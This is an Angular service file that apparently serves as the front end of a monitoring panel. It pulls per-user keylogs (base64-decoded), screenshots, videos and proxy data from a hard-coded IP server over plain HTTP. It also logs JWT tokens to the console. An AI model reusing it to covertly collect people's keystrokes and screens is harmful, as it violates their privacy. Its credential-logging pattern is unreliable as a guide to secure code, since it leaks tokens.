
import { HttpClient } from "@angular/common/http";
import { Injectable, OnInit } from "@angular/core";
import { BehaviorSubject, Observable, of } from "rxjs";
import { HexBase64BinaryEncoding } from 'crypto';
import { tap, mapTo, catchError } from 'rxjs/operators';

export class Keylog
{
  out: string
}
export class Screenshot {
  link: string;
  name: string;
  size: number;
  timestamp: string;
}
export class Media {
  files: Screenshot[];
}
export class User {
  uuid: string;
  company: string;
  sector: string;
  first_name: string;
  middle_name: string;
  last_name: string;
  full_name: string;
  private _photo: string = "";
  get photo(): string {
    return this._photo;
  }
  set photo(value: string) {
    this._photo = ServerService.HOST + value;
    // console.log(this._photo);
  }
  role: string;
}

export class Tokens {
  jwt: string;
  refreshToken: string;
}

@Injectable({
  providedIn: "root",
})
export class ServerService {
  private msg = new BehaviorSubject<string>(
"NoUser"
  );
  private curUser = new BehaviorSubject<User>(
    null
  );
  telecastUser = this.curUser.asObservable();
  telecast = this.msg.asObservable();
  allusers: User[];
  public HOST = "http://77.37.136.144:8383/";
  static HOST: string = "http://77.37.136.144:8383/";
  constructor(private http: HttpClient) {}

  getAllUsers() {
    const got = this.http.get(this.HOST + "users");
    got.subscribe((response: User[]) => {
      this.allusers = response;
      this.curUser.next(response[0]);
      this.msg.next(response[0].uuid);
    });
    return got;
  }
  editUuid(uuid) {
    this.msg.next(uuid);
  }
  editUser(user) {
    this.curUser.next(user);
  }

  getScreenShotsForUser(uuid: string): Observable<Media> {
    // console.log(' this.HOST + "user/screenshots?uuid=" + uuid :>> ',  this.HOST + "user/screenshots?uuid=" + uuid);
    return this.http.get<Media>(
      this.HOST + "user/screenshots?uuid=" + uuid
    );
  }
  getProxy(uuid: string): Observable<Keylog> {
    // console.log(' this.HOST + "user/screenshots?uuid=" + uuid :>> ',  this.HOST + "user/proxy?uuid=" + uuid);
    return this.http.get<Keylog>(
      this.HOST + "user/proxy?uuid=" + uuid
    );
  }
  getVideosForUser(uuid: string): Observable<Media> {
    return this.http.get<Media>(this.HOST + "user/videos?uuid=" + uuid);
  }
  getKeylogForUser(uuid: string): Observable<Keylog> {
    return this.http.get<Keylog>(this.HOST + "user/keylog?uuid=" + uuid);
  }
  decodefrom64  = () => (source: Observable<Keylog>) =>
  new Observable(observer => {
    return source.subscribe({
      next(x) {
        observer.next(
          atob(x.out)
        );
      },
      error(err) { observer.error(err); },
      complete() { observer.complete(); }
    });
  });






  /////////////
  login(user:{username:string,password:string}):Observable<boolean>{
    // const HOST_BLA = "http://77.37.136.144:8383/";
    return this.http.post<any>("http://77.37.136.144:8383"+'/api/user/login', JSON.stringify(user))
    .pipe(
      tap(tokens=> this.doLoginUser(user.username,tokens)),
      mapTo(true),
      catchError(error=>{
        return of(false);
      })
    )
  }
  private loggedUser: string;
  public IsAuthored:BehaviorSubject<boolean>;
  private readonly JWT_TOKEN = 'JWT_TOKEN';
  private readonly REFRESH_TOKEN = 'REFRESH_TOKEN';
  private doLoginUser(username: string, tokens: Tokens) {
    this.loggedUser = username;
    this.storeTokens(tokens);
    console.log("tokens:"+tokens+"user: "+username);
    this.IsAuthored.next(true);
  }
  private storeTokens(tokens: Tokens) {
    localStorage.setItem(this.JWT_TOKEN, tokens.jwt);
    localStorage.setItem(this.REFRESH_TOKEN, tokens.refreshToken);
  }
/////////////
}
